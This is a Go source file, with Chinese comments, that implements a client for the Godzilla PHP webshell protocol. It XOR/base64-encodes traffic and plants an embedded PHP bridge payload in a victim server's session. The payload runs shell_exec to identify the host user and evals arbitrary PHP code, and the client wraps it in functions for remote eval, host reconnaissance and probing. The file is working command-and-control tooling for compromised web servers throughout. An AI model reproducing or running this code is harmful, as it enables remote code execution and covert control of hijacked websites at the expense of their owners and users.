// 原生哥斯拉兼容通道(godzilla,PHP_XOR_BASE64 默认形态):
//   password = POST 参数名,secret_key = 密钥源;马侧密钥 key = md5(secretKey)[0:16]。
//   初始化:首包注册桥接载荷(马侧写 session,载荷文本须含 "getBasicsInfo" 字面量)。
//   请求体 = "<pass>=<urlencode(base64(XOR(serialize(params), key 流)))>"
//   响应 = md5(pass+key)[0:16] + base64(XOR(result)) + md5(pass+key)[16:32]
package webshellproto

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"sync"
)

const godzillaBridgePayload = `// wsm bridge payload (getBasicsInfo entry compatible)
function run($pms){
    $parameters = array();
    $pos = 0; $len = strlen($pms);
    while ($pos < $len) {
        $sep = strpos($pms, "\x02", $pos);
        if ($sep === false) break;
        $k = substr($pms, $pos, $sep - $pos);
        $vl = ord($pms[$sep+1]) | (ord($pms[$sep+2])<<8) | (ord($pms[$sep+3])<<16) | (ord($pms[$sep+4])<<24);
        $parameters[$k] = substr($pms, $sep + 5, $vl);
        $pos = $sep + 5 + $vl;
    }
    $out = '';
    if (isset($parameters['methodName'])) {
        $m = $parameters['methodName'];
        if ($m === 'getBasicsInfo') {
            $u = '';
            if (function_exists('shell_exec')) { $u = @shell_exec(PHP_OS_FAMILY === 'Windows' ? 'whoami' : 'id -un'); }
            $out = json_encode(array('user' => trim((string)$u), 'os' => PHP_OS, 'cwd' => getcwd(), 'php' => PHP_VERSION));
        } elseif ($m === 'wsmBridge' && isset($parameters['code'])) {
            ob_start();
            try { eval($parameters['code']); } catch (Throwable $e) {}
            $out = ob_get_clean();
        }
    }
    return $out;
}
`

// godzillaInited 已完成载荷注册的 scope 集合(会话作用域绑定目标 URL)。
var godzillaInited sync.Map

// GodzillaInvalidate 清除载荷注册态(连接删除/编辑后)。
func GodzillaInvalidate(scope string) { godzillaInited.Delete(scope) }

func godzillaKey(conn *Conn) string {
	return MD5Hex(conn.SecretKey)[:16]
}

func xorStream(buf []byte, key string) []byte {
	kb := []byte(key)
	out := make([]byte, len(buf))
	for i := range buf {
		out[i] = buf[i] ^ kb[(i+1)&15]
	}
	return out
}

// GodzillaSerializeParams 哥斯拉参数序列化:key + \x02 + int32LE(len) + value。
func GodzillaSerializeParams(params [][2]string) []byte {
	var buf bytes.Buffer
	for _, kv := range params {
		vb := []byte(kv[1])
		buf.WriteString(kv[0])
		buf.WriteByte(0x02)
		var lenb [4]byte
		binary.LittleEndian.PutUint32(lenb[:], uint32(len(vb)))
		buf.Write(lenb[:])
		buf.Write(vb)
	}
	return buf.Bytes()
}

func godzillaPost(conn *Conn, bodyParams [][2]string) (*HTTPResult, error) {
	key := godzillaKey(conn)
	encoded := B64(xorStream(GodzillaSerializeParams(bodyParams), key))
	body := conn.Password + "=" + url.QueryEscape(encoded)
	scope := conn.scopeKey()
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	if cookie := CookieHeaderFor(scope); cookie != "" {
		headers["Cookie"] = cookie
	}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	res, err := HTTPDo("POST", conn.URL, headers, []byte(body), conn.timeout())
	if err != nil {
		return nil, err
	}
	AbsorbCookies(scope, res.Headers)
	return res, nil
}

// godzillaEnsureInit 首包:注册桥接载荷(马侧写入 session)。
func godzillaEnsureInit(conn *Conn) error {
	scope := conn.scopeKey()
	if _, ok := godzillaInited.Load(scope); ok {
		return nil
	}
	key := godzillaKey(conn)
	payloadBody := B64(xorStream([]byte(godzillaBridgePayload), key))
	body := conn.Password + "=" + url.QueryEscape(payloadBody)
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	res, err := HTTPDo("POST", conn.URL, headers, []byte(body), conn.timeout())
	if err != nil {
		return err
	}
	AbsorbCookies(scope, res.Headers)
	if !strings.Contains(strings.ToLower(CookieHeaderFor(scope)), "phpsessid") {
		return fmt.Errorf("载荷注册失败:未建立会话(pass 字段名/密钥可能不符)")
	}
	godzillaInited.Store(scope, true)
	return nil
}

// godzillaParseResponse 解析响应:md5 定位符之间 → b64 → XOR → 明文。
func godzillaParseResponse(conn *Conn, body []byte) ([]byte, error) {
	key := godzillaKey(conn)
	md := MD5Hex(conn.Password + key)
	text := string(body)
	left, right := md[:16], md[16:]
	i := strings.Index(text, left)
	if i < 0 {
		return nil, fmt.Errorf("响应定位失败(md5 定位符不符——pass/密钥可能不匹配)")
	}
	j := strings.Index(text[i+len(left):], right)
	if j < 0 {
		return nil, fmt.Errorf("响应定位失败(md5 定位符不符——pass/密钥可能不匹配)")
	}
	mid := strings.TrimSpace(text[i+len(left) : i+len(left)+j])
	raw, err := Unb64(mid)
	if err != nil {
		return nil, fmt.Errorf("响应解码失败")
	}
	return xorStream(raw, key), nil
}

// GodzillaCallMethod 调用一个方法(经桥接载荷)。
func GodzillaCallMethod(conn *Conn, methodName string, extra [][2]string) ([]byte, error) {
	if err := godzillaEnsureInit(conn); err != nil {
		return nil, err
	}
	params := append([][2]string{{"methodName", methodName}}, extra...)
	res, err := godzillaPost(conn, params)
	if err != nil {
		return nil, err
	}
	if res.Status != 200 {
		return nil, fmt.Errorf("马侧拒绝(HTTP %d)", res.Status)
	}
	return godzillaParseResponse(conn, res.Body)
}

// GodzillaEval eval PHP 代码(桥接载荷 wsmBridge)。
func GodzillaEval(conn *Conn, code string) (string, error) {
	out, err := GodzillaCallMethod(conn, "wsmBridge", [][2]string{{"code", code}})
	return string(out), err
}

// GodzillaBasicInfo 基本信息结构化(桥接载荷 getBasicsInfo)。
func GodzillaBasicInfo(conn *Conn) (map[string]any, error) {
	raw, err := GodzillaCallMethod(conn, "getBasicsInfo", nil)
	if err != nil {
		return nil, err
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, fmt.Errorf("getBasicsInfo 输出非 JSON")
	}
	return m, nil
}

// GodzillaProbe 探测。
func GodzillaProbe(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 9000)
	out, err := GodzillaEval(probe, `echo "`+token+`";`)
	return err == nil && strings.Contains(out, token)
}
